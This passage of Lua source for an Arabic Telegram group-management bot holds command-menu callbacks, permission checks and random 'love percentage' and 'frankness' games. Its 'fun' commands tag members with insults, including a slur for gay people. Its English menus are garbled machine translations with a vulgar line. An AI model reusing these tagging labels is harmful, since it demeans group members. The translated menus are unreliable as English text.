{text = '☊.رجوع.☊', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help5' then
if not Mod(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ قائمة اوامر المدراء والمنشئ..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع او تنزيل ادمن
◉ رفع او كشف القيود
◉ تنزيل الكل
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ تفعيل او تعطيل الايدي بالصوره
◉ تفعيل او تعطيل الايدي
◉ تفعيل او تعطيل الردود العامه
◉ تفعيل او تعطيل الالعاب
◉ تفعيل او تعطيل الردود
◉ تفعيل او تعطيل اطردني
◉ تفعيل او تعطيل الرفع
◉ تفعيل او تعطيل الحظر
◉ تفعيل او تعطيل الرابط
◉ تفعيل او تعطيل اوامر التسليه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ تعين او مسح الايدي..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع الادمنيه
◉ اضف او مسح رد
◉ الادمنيه
◉ الردود
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ مسح + عدد
◉ مسح الادمنيه
◉ مسح الردود
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ اوامر المنشئين الاساسين..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع او تنزيل منشئ
◉ مسح المنشئين
◉ المنشئين
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ اوامر المنشئين..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ مسح او مسح الاوامر المضافه
◉ اضف مجوهرات + العدد بالرد
◉ اضف رسائل + العدد بالرد
◉ تعين او مسح الايدي
◉ اضف او مسح امر
◉ رفع/تنزيل مدير
◉ الاوامر المضافه
◉ مسح المدراء
◉ الـمـدراء
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.رجوع.☊', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help6' then
if not Mod(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ قائمة اوامر المطورين..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ المـطور الـعـادي..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ اذاعه بالتوجيه للمجموعات
◉ اذاعه موجهه بالتـثبيت
◉ جلب نسخه احتياطيه
◉ اذاعه بالتوجيه خاص
◉ رفع نسخه احتياطيه
◉ تغيير رابط الجروب
◉ رفع او تنزيل مالك
◉ اذاعه بالمجموعات
◉ اذاعه بالتـثبيت
◉ مسح المالكين
◉ اذاعه خـاص
◉ الاحصائيات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ المطور الاساسي..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ جلب او رفع نسخه احتياطيه
◉ اذاعه بالتوجيه للمجموعات
◉ رفع او تنزيل  مميز عام 
◉ اذاعه موجهه بالتثبيت
◉ اضف او مسح رد عام
◉ اذاعه بالتوجيه خاص
◉ تغيير رساله المغادره
◉ مسح المميزين عام
◉ مسح الردود العامه
◉ رفع او تنزيل مطور 
◉ مسح المطورين
◉ حظر او كتم عام 
◉ المكتومين  عام 
◉ المحظورين عام
◉ ضع اسم للبوت
◉ اذاعه بالتثبيت
◉ الاحصائيات
◉ المطورين 
◉ الغاء العام
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.رجوع.☊', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help7' or text == 'اوامر التسليه' then
if not Mod(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ قائمة اوامر التسليه..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← الامر
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← متوحد 
◉ تاك للمتوحدين
◉ مسح المتوحدين
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← رقاصه
◉ تاك للرقصات
◉ مسح الرقصات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← ابني
◉ تاك لولادي
◉ مسح ولادي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← بنتي
◉ تاك لبناتي
◉ مسح بناتي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← قطتي
◉ تاك للقطط
◉ مسح القطط
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← دكري
◉ تاك للدكراتي
◉ مسح دكراتي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← فاشل
◉ تاك للفشله
◉ مسح الفشله
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← حيوان
◉ تاك للحيونات
◉ مسح الحيوانات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← خاينه
◉ تاك للخينات
◉ مسح الخينات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← عبيط
◉ تاك للعبايط
◉ مسح العبايط
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← خاين
◉ تاك للخونه
◉ مسح الخونه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← مراتي
◉ تاك لمرتاتي
◉ مسح مرتاتي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← شاذ
◉ تاك للشواذ
◉ مسح الشواذ
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← خطيبتي
◉ تاك لخطيبتي
◉ مسح خطيبتي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← علق
◉ تاك للعلوق
◉ مسح العلوق
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← مزه
◉ تاك للمزز
◉ مسح المزز
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← وتكه
◉ تاك للوتكات
◉ مسح الوتكات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← كلب
◉ تاك للكلاب
◉ مسح الكلاب
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← قرد 
◉ تاك للقرود
◉ مسح القرود
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← بقره
◉ تاك للبقرات
◉ مسح البقرات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← غبي
◉ تاك للاغبياء
◉ مسح الاغبياء
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← حمار
◉ تاك للحمير
◉ مسح الحمير
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل 
◉ بقلبي او من قلبي
◉ تاك للي بقلبي
◉ مسح اللي بقلبي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← زوجتي
◉ تاك للزوجات
◉ مسح الزوجات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ رفع + تنزيل ← مطلقه
◉ تاك للمطلقات
◉ مسح المطلقات
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.رجوع.☊', callback_data="/help90"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/help8' then
if not Sudo(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ قم بأختيار اللغه.. ↑↓
◉ Choose language.. ↑↓ 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'english 𝅘𝅥𝅮', callback_data="/add"},{text = 'عربي 𝅘𝅥𝅮', callback_data="/help90"},
},
{
{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ', url="t.me/so_alfaa  "},
},
{
{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end

if Text == '/help90' then
if not Sudo(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ اهلا بك في قسم الاوامر ..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ اليك الاوامر الخاص بسورس الفا .
◉ اختر الامر الذي تريده من الازرار بلاسفل .
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀 ](t.me/so_alfaa  )
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '◉ اوامر الحمايه .', callback_data="/help3"},{text = '◉ اوامر الادمنيه .', callback_data="/help4"},
},
{
{text = '◉ اوامر الاداره .', callback_data="/help5"},{text = '◉ اوامر المطور .', callback_data="/help6"},
},
{
{text = '◉ اوامر التسليه .', callback_data="/help7"},
},
{
{text = '◉ اوامر القفل .', callback_data="/help1"},{text = '◉ اوامر التعطيل .', callback_data="/help2"},
},
{
{text = '☊.BACK.☊', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
------------------------------ callback add dev mr sofi
if Text == '/mute-name' then
if not Constructor(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉️ ❬ m 1 ❭ Orders Protect Group ⇊
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Lock «Open + it
◉ Lock «» Open ❬ All ❭
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Chat
◉ Knows
◉ Pictures
◉ videos
◉ Sticker
◉ files
Mobile moving
◉ Lift
◉ Audio
◉ Optiments
◉ Welcome
◉ The decorative
◉ Translate
◉ Responses
◉ Guidance
◉ Notifications
◉ Crown
◉ Delete link
◉ expulsion
◉ Games
◉ Novels
◉ towers
◉ Meanings of names
◉ Welcome
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Links
◉ Guidance
◉ popcorn
◉ Bots
◉ Prohibited
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.BACK.☊', callback_data="/add"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/sofi' then
if not Constructor(data) then
local notText = 'المعذره هذا الامر ليس لك..??♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ ❬ m 2 ❭ 2 ◉ entertainment orders ⇊
◉ Lifting «» Download + it
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ and Take
◉ Crown for Soutat
◉ Wipe Wattat
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉
◉ Crown for drapes
◉ Clear Docks
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Jeep
◉ Crown for bodies
◉ Scanning
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ animal
◉ Crown for animals
◉ Animals
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ failed
◉ Crown for failure
◉ Scan of failure
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Dermatology
◉ Crown for perforation
◉ Scanning
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Catte
◉ Crown for cats
◉ Cats survey
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '☊.BACK.☊', callback_data="/add"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-names' then
if not Constructor(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ ❬ m 3 ❭ 3 ◉ Tall orders ⇊
◉ Lifting «← Download + it
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ my son
◉ Crown for children
◉ Survey sons
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Crown for girls
◉ Clear the girls
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ Habayeb survey..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ my husband
◉ Crown for couples
◉ Survey of couples
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ My wife
◉ Crown for the wives
◉ Wipe waves
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Khayen
◉ Crown for him
◉ Clear the moon
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Crown for the two
◉ Khiennine survey
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Abit
◉ Crown for the mixture
◉ Survey
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Crown for Paradise
◉ Storage survey
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.BACK.☊', callback_data="/add"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-id' then
if not Constructor(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ ❬ m 4 ❭ Orders of members ⇊
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Age account
◉ Picture «←
◉ Quran
◉ Settings
◉ Qatari
◉ Delete «← Sell ❬ Qatari
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ My messages «← Delete 
◉ Decorating «← Songs
◉ Movies «← Cartoon
◉ Translate + novels
◉ YouTube ← Games
◉ Weather + area
◉ Dark «link
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ My name is 
◉ My Juices «← Delete my juices
◉ Powers «← Ping
◉ Say + word
◉ Prohibited Words
◉ I am Maine
◉ Say + word
◉ Qatah «← dog
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Source «Developer
◉ link «hands
◉ Rank «← Revealed
◉ Reply you, Bot
◉ Any your opinion Yapot
◉ Hino «← Hinha
◉ Boso «← her pussy
◉ Mido «← ←
◉ Delete link
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.BACK.☊', callback_data="/add"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/change-photo' then
if not Constructor(data) then
local notText = 'المعذره هذا الامر ليس لك..🙂♥️'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(notText).."&show_alert=true")
return false
end
local Teext =[[
◉ ❬ m 5 ❭ Orders of developers ⇊
◉ Developer ←⇊
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Lifting «download ❬ owner ❭
◉ Change the group link
◉ Destination of groups
◉ Destination by guidance for groups
◉ A radio face
◉ Special radio
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ A special guidance
◉ Fix the installation
◉ bring back copy
◉ raise its backup copy
◉ Statistics
◉ Delete owners
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
        ╔═══════════════╗        
             ◉ Basic Developer..↑↓
        ╚═══════════════╝        
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Add "← Delete a general response
◉ Lifting «download ❬ special year ❭
◉ Featured Survey
◉ General responses
◉ Delete public responses
◉ A special guidance
◉ Destination by guidance for groups
◉ Fix the installation
◉ A radio face
◉ bring «← raising 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ Statistics
◉ Lifting «download ❬ Developer ❭
◉ Developers «← Delete developers
◉ Put the name of the bot
◉ Change the departing message
◉ Prohibition «← Mute ❬ General ❭
◉ General makers
◉ Preventors General
◉ Canceling the general
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '☊.BACK.☊', callback_data="/add"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
--- callback added
if Text == '/add' then
local Teext =[[
◉ Welcome to the orders section.. ↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ You can use the buttons..↑↓
◉ By putting pressure on them..↑↓
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '◉ protection', callback_data="/mute-name"},{text = '◉ addictive', callback_data="/sofi"},
},
{
{text = '◉ Administration', callback_data="/change-names"},
},
{
{text = '◉ Developer', callback_data="/change-id"},{text = '◉ Disabled orders', callback_data="/change-photo"},
},
{
{text = '☊.BACK.☊', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if data.ID == "UpdateNewMessage" then  -- new msg
msg = data.message_
text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if text and not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:del(bot_id..'Spam:Texting'..msg.sender_user_id_) 
end
--------------------------------------------------------------------------------------------------------------
if text and database:get(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
if NewCmmd then
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text)
database:del(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:srem(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,' ◉ تم مسح الامر')  
else
send(msg.chat_id_, msg.id_,' ◉ لا يوجد امر بهاذا الاسم')  
end
database:del(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end 
-------------------------------------------------------------------------------------------------------------- 
if data.message_.content_.text_ then
local NewCmmd = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if (text and text == "تعطيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' ◉ تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, '  ◉ تم تفعيل اوامر التسليه')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
if text == "نسبه الحب" or text == "نسبه حب" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:lov'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_,"sendlove")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال روظي و وروان'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الحب" and database:get(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_) == "sendlove" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","49","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه حب '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "نسبه الكره" or text == "نسبه كره" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال اسد و لبوى'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الكره" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","8","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه كره '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "نسبه رجوله" or text == "نسبه الرجوله" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه رجولته \n مثال مصطفئ'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه رجوله" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه رجوله '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "صراحه" or text == "الصراحه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rkko'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rkko_Bots"..msg.chat_id_,"sendrkkoe")
local LEADER_Msg = {
"صراحه  |  صوتك حلوة؟",
"صراحه  |  التقيت الناس مع وجوهين؟",
"صراحه  |  شيء وكنت تحقق اللسان؟",
"صراحه  |  أنا شخص ضعيف عندما؟",
"صراحه  |  هل ترغب في إظهار حبك ومرفق لشخص أو رؤية هذا الضعف؟",
"صراحه  |  يدل على أن الكذب مرات تكون ضرورية شي؟",
"صراحه  |  أشعر بالوحدة على الرغم من أنني تحيط بك كثيرا؟",
"صراحه  |  كيفية الكشف عن من يكمن عليك؟",
"صراحه  |  إذا حاول شخص ما أن يكرهه أن يقترب منك ويهتم بك تعطيه فرصة؟",
"صراحه  |  أشجع شيء حلو في حياتك؟",
"صراحه  |  طريقة جيدة يقنع حتى لو كانت الفكرة خاطئة توافق؟",
"صراحه  |  كيف تتصرف مع من يسيئون فهمك ويأخذ على ذهنه ثم ينتظر أن يرفض؟",
"صراحه  |  التغيير العادي عندما يكون الشخص الذي يحبه؟",
"صراحه  |  المواقف الصعبة تضعف لك ولا ترفع؟",
"صراحه  |  نظرة و يفسد الصداقة؟",
"صراحه  |  ‏‏إذا أحد قالك كلام سيء بالغالب وش تكون ردة فعلك؟",
"صراحه  |  شخص معك بالحلوه والمُره؟",
"صراحه  |  ‏هل تحب إظهار حبك وتعلقك بالشخص أم ترى ذلك ضعف؟",
"صراحه  |  تأخذ بكلام اللي ينصحك ولا تسوي اللي تبي؟",
"صراحه  |  وش تتمنى الناس تعرف عليك؟",
"صراحه  |  ابيع المجرة عشان؟",
"صراحه  |  أحيانا احس ان الناس ، كمل؟",
"صراحه  |  مع مين ودك تنام اليوم؟",
"صراحه  |  صدفة العمر الحلوة هي اني؟",
"صراحه  |  الكُره العظيم دايم يجي بعد حُب قوي تتفق؟",
"صراحه  |  صفة تحبها في نفسك؟",
"صراحه  |  ‏الفقر فقر العقول ليس الجيوب  ، تتفق؟",
